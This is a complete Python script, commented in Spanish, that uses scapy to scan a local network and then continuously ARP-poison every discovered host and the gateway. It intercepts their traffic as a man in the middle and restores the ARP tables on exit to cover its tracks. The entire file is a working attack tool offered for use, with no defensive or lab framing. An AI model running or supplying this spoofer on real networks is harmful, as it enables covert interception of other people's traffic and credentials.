#!/usr/bin/eny python
# -*- coding: utf8 -*-

from scapy.all import *
from colorama import Fore, init
import argparse
import sys

#--- iniciamos la configuracion con lo anterior importado
init()

#--- definimos los argumentos que recibira nuestro programa 
parse = argparse.ArgumentParser()
parse.add_argument("-r","--range", help= "Rango a escanear o spoofear") # esto define los argumento tales como el rango de nuestra ip
parse.add_argument("-g","--gateway",help="Gateway") # aqui definimos la configuracion de nuestra ip
parse = parse.parse_args() # introducimos los argumento en la variable parse

#aqui se encargara de optener la direcion mac de la maquina
def obteniendo_la_mac(gateway):

	arp_Layer = ARP(pdst=gateway) #optenemos la obtendremos la ip

	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") #esta es la configuracion mac

	final_packet = broadcast / arp_Layer 

	mac = srp(final_packet,timeout=2, verbose=False)[0]

	mac = mac[0][1].hwsrc #aqui vamos a tener la mac de nuestro router

	return mac

#scanearemos nuestra red para enlistar los dispositivos por mac y ip, 
#creando un diccionario, en clave valor

def red_scanner(range,gateway):

	lista_host = dict()

	arp_Layer = ARP(pdst=range)

	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

	final_packet = broadcast / arp_Layer

	answers = srp(final_packet, timeout=2, verbose=False)[0]

	print("\n")

	for i in answers:
		if i != gateway:

			print(

				"[{} + {}] HOST: {} MAC: {}".format(Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX,i[1].psrc,i[1].hwsrc
				))
			lista_host.update({i[1].psrc:i[1].hwsrc})

	return lista_host


# cuando terminemos de cambiar nuestra ip con la funcion de arriba, nos
# encargaramos de borrar nuestras huellas dentro de la red restableciendo
# la ip del router y nuestra ip terminando nuestra coneccion

def restaurar_arp(destip,sourceip,hwsrc,hwdst):
	
	dest_mac = hwdst
	source_mac = hwsrc
	packet = ARP(op=2, pdst=destip, hwdst=dest_mac,psrc=sourceip,hwsrc=source_mac)
	send(packet,verbose=False)

#aqui inyectaremos o mejor dicho intersectaremos las peticiones http
#esta es una de la funciones mas importantes
def arp_spoofing(hwdst,pdst,psrc):
	spoofer_packet=ARP(op=2,hwdst=hwdst,pdst=pdst,psrc=psrc)
	send(spoofer_packet,verbose=False)


#aqui vamos ha ver las host es decir los usuarios conectados a la red
#inivializando el scaner e implementando todas las funciones anteriores
def main():
	
	#verificamos si los parametros de rango de ip y  nuestra ip son verdaderas
	#si es asi el programa iniciara escaneando a los usuarios, sino pues mandara
	#un else el cual te dira que no introdugiste un valor
	if parse.range and parse.gateway:
		mac_gateway = obteniendo_la_mac(parse.gateway)
		hosts=red_scanner(parse.range,parse.gateway)

		try:
			#esto hara que nuestra optencion de usurios en la red sea infinita
			#siempre y cuando no aprieten la combinacion de teclas de mas adelante
			print("\n [{}+{}] Corriendo.....".format(Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX))
			while True:
				for n in hosts:
					mac_target = hosts[n]
					ip_target = n

					gateway = parse.gateway

					arp_spoofing(mac_gateway,gateway,ip_target)
					arp_spoofing(mac_target,ip_target,gateway)

					print("\n [{}+{}] suplantando: {}".format(Fore.LIGHTGREEN_EX,Fore.LIGHTWHITE_EX, ip_target)),
					sys.stdout.flush()
	#cuando terminemos de iptener lo que queremos precionamos ctrl + c para terminar el programa
	#aqui se llamara la funcion restore_arp
		except KeyboardInterrupt:

			print("\n\n Restaurando tablas ARP...")
			for n in hosts:

				mac_target = hosts[n]
				ip_target = n

				gateway = parse.gateway
				restaurar_arp(gateway,ip_target,mac_gateway,mac_target)
				restaurar_arp(ip_target,gateway,mac_target,mac_gateway)

			exit(0)

		

	else:
		print("Necesito valores")



if __name__ == '__main__':
	main()